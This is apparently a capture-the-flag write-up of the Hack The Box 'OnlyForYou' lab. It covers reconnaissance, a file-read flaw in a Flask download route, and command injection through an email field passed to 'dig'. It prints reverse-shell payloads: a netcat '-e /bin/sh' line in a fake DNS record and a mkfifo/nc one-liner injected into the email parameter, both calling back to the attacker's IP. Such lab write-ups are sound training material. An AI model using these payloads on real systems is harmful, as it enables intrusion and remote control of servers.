# HTB - OnlyForYou
## Start: 29/05/23
## IP: 10.10.11.210
---
## Info Gathering
### Nmap Scan
```
nmap -sV -sC 10.10.11.210                                                                                                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 17:28 BST
Nmap scan report for 10.10.11.210
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds

```

### CURL
```
curl onlyforyou.htb                                                                        
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

curl -L onlyforyou.htb
curl: (6) Could not resolve host: only4you.htb

```

Included only4you.htb into `/etc/hosts` and website connects correctly.

### WEB ANALYSIS
### http://only4you.htb
Single page site interesting info:
- Link to beta.only4you.htb
- email address info@only4you.htb

### http://beta.only4you.htb
Site hosting demo tools interesting info:
- Source code downloadable
- "image resizer" tool
- "file converter" tool

### GOBUSTER dirs
Nothing for only4you.htb, stuff for beta.only4you.htb

```
 gobuster-linux-amd64/gobuster dir -u http://beta.only4you.htb/ -w ~/Programs/Security/Lists/SecLists/Discovery/Web-Content/raft-medium-words.txt               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://beta.only4you.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/elliot/Programs/Security/Lists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/29 17:43:02 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 405) [Size: 683]
/list                 (Status: 200) [Size: 5934]
/source               (Status: 200) [Size: 12127]
/resize               (Status: 200) [Size: 2984] 
/convert              (Status: 200) [Size: 2760] 


```


## Vulnerability Hunting

### Source code analysis
Inital thoughts are on the download function within app.py 
```
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```
Exploiting this is just too easy, it just needs to be an absolute path and the application will happily provide any file as long as it exists.
![Directory Traversal 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/directory_traversal1.png)

So 2 users we may need to look out for being John and Dev

## LFI Vulnerability
Using the Local File Inclusion vulnerability, i searched for default configuration files, knowing the site was hosted on NGINX, i searched
`/etc/nginx/nginx.conf` which didn't give anything useful, checking `/etc/nginx/sites-enabled/default` however...

```
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

which led me to perform the same LFI on `/var/www/beta.only4you.htb/app.py` to see if we recieved the source code as expected...
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 29 Apr 2023 18:31:20 GMT
Content-Type: text/x-python; charset=utf-8
Content-Length: 4551
Connection: close
Content-Disposition: attachment; filename=app.py
Last-Modified: Sun, 11 Dec 2022 13:25:09 GMT
Cache-Control: no-cache
ETag: "1670765109.8359272-4551-3480357964"

from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
...
```
I perform the same on the main page, stands to reason that the developer used the same python backend to host both, so i did the same on `/var/www/only4you.htb/app.py` ...
```
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr
        status = sendmessage(email, subject, message, ip)
...
```
This seems to be what controls that email form previously seen, i also attempted to see if this `form` import is also locally included in this directory. `/var/www/only4you.htb/form.py`

I will attempt to only show the relevant code lines here.
```
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        output = result.stdout.decode('utf-8')
        if "v=spf1" not in output:
            return 1
        else:
        domains = []
        ips = []
        if "include:" in output:
            dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
            dms.pop(0)
            for domain in dms:
                domains.append(domain)
            while True:
                for domain in domains:
                    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```
This starts by checking our provided email against this regex, it then takes the domain by splitting the email by the @ symbol and taking the 1st (2nd) var in the list.

However this implementation is flawed, the regex can be bypassed to provide an IP address instead of a domain by including a seperate `@` symbol.

e.g. `test@10.10.14.77@google.com` will pass the regex AND the code will assign domain = 10.10.11.1

So as we can provide a controlled ip as the "domain" which the system will use the `dig` command against to get a txt record from it. It will then take the output, as long as the output includes `v=spf1` the code will then look for instances of `include:`, seperate them into a list and remove the first with `pop(0)`. It will then run dig again against the list objects.

The problem with this is again the regex does not hold up to more testing, if the output is multiple `include:`, as long as one of them contains a domain suffix the whole is treated legitmately.

e.g. `include: teehee include: ; echo 'PWND' include:.ds`

So as we can see there is an oppurtunity for RCE due to the usage of `subprocess.run()` in this python script. 

To test this vulnerability, i create a fakedns server which will respond to txt queries with: `include: test include: ; nc -e /bin/sh 10.10.14.77 4444`

While exploiting this i found that the secondary exploit of setting up a dns server wasn't needed, the first dig command can be exploited by simply adding a `;` after the domain and then a command straight after.

e.g. `&email=test@google.com; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 4444 >/tmp/f`

## Initial Access: www-data

```
Connection received on 10.10.11.210 58992
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

